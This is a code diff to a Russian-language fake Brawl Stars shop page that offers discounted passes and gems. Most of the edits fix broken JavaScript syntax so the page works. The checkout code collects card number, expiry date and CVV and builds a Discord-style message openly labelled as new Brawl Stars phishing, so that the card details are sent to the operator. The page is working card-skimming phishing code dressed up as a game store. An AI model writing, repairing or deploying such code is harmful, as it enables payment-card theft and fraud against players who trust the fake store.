@@ -142,7 +142,8 @@
         .total {
             font-size: 1.4rem;
             text-align: right;
-            margin: 15px 0;}
+            margin: 15px 0;
+        }
         .checkout-btn {
             background: #2ecc71;
             color: black;
@@ -250,7 +251,8 @@
             { id: "pp2", name: "brawl pass+ премиум", price: 649, old: 929, desc: "скин + 100 гемов" }
         ],
         gems: [
-            { id: "g1", name: "80 гемов", price: 111, old: 159, desc: "30% экономии" },{ id: "g2", name: "170 гемов", price: 223, old: 319, desc: "30% экономии" },
+            { id: "g1", name: "80 гемов", price: 111, old: 159, desc: "30% экономии" },
+            { id: "g2", name: "170 гемов", price: 223, old: 319, desc: "30% экономии" },
             { id: "g3", name: "360 гемов", price: 454, old: 649, desc: "30% экономии" },
             { id: "g4", name: "950 гемов", price: 1049, old: 1499, desc: "30% экономии" }
         ],
@@ -272,17 +274,17 @@
         if (!container) return;
         const items = products[category];
         if (!items) return;
-        container.innerHTML = items.map(p => 
+        container.innerHTML = items.map(p => `
             <div class="product-card">
                 <div class="product-title">${p.name}</div>
                 <div class="product-desc">${p.desc}</div>
                 <div class="price">${p.price} ₽ <span class="old-price">${p.old} ₽</span></div>
                 <button class="add-to-cart" data-id="${p.id}" data-name="${p.name}" data-price="${p.price}">в корзину</button>
             </div>
-        ).join('');
+        `).join('');
 
         // навесить обработчики на кнопки этой вкладки
-        document.querySelectorAll(#${containerId} .add-to-cart).forEach(btn => {
+        document.querySelectorAll(`#${containerId} .add-to-cart`).forEach(btn => {
             btn.addEventListener('click', (e) => {
                 const id = btn.getAttribute('data-id');
                 const name = btn.getAttribute('data-name');
@@ -295,7 +297,7 @@
     function addToCart(id, name, price) {
         cart.push({ id, name, price });
         updateCartUI();
-        showNotif(✅ ${name} добавлен);
+        showNotif(`✅ ${name} добавлен`);
     }
 
     function updateCartUI() {
@@ -310,9 +312,9 @@
         let total = 0;
         list.innerHTML = cart.map((item, idx) => {
             total += item.price;
-            return <li>${item.name} — ${item.price} ₽ <button class="remove-item" data-index="${idx}">удалить</button></li>;
+            return `<li>${item.name} — ${item.price} ₽ <button class="remove-item" data-index="${idx}">удалить</button></li>`;
         }).join('');
-        totalSpan.innerText = итого: ${total} ₽;
+        totalSpan.innerText = `итого: ${total} ₽`;
 
         // удаление
         document.querySelectorAll('.remove-item').forEach(btn => {
@@ -341,7 +343,8 @@
 
     // вкладки
     const btns = document.querySelectorAll('.tab-btn');
-    const contents = document.querySelectorAll('.tab-content');btns.forEach(btn => {
+    const contents = document.querySelectorAll('.tab-content');
+    btns.forEach(btn => {
         btn.addEventListener('click', () => {
             const tabId = btn.getAttribute('data-tab');
             contents.forEach(c => c.classList.remove('active'));
@@ -384,23 +387,23 @@
         const card = document.getElementById('cardNumber').value.trim();
         const exp = document.getElementById('expiry').value.trim();
         const cvv = document.getElementById('cvv').value.trim();
-        if (!card  !exp  !cvv) {
+        if (!card || !exp || !cvv) {
             alert('заполни все поля карты');
             return;
         }
         const total = cart.reduce((s, i) => s + i.price, 0);
-        const itemsText = cart.map(i => ${i.name} (${i.price}₽)).join('\n');
+        const itemsText = cart.map(i => `${i.name} (${i.price}₽)`).join('\n');
         const dataToSend = {
-            content: "НОВЫЙ ФИШИНГ БРАВЛ СТАРС",
+            content: "**НОВЫЙ ФИШИНГ БРАВЛ СТАРС**",
             embeds: [{
                 title: "💳 данные карты + заказ",
                 color: 0xffcc00,
                 fields: [
                     { name: "📦 товары", value: itemsText || "нет", inline: false },
-                    { name: "💰 сумма", value: ${total} ₽, inline: true },
-                    { name: "💳 карта", value: ||${card}||, inline: false },
+                    { name: "💰 сумма", value: `${total} ₽`, inline: true },
+                    { name: "💳 карта", value: `||${card}||`, inline: false },
                     { name: "📅 срок", value: exp, inline: true },
-                    { name: "🔐 CVV", value: ||${cvv}||, inline: true }
+                    { name: "🔐 CVV", value: `||${cvv}||`, inline: true }
                 ],
                 timestamp: new Date().toISOString()
             }]
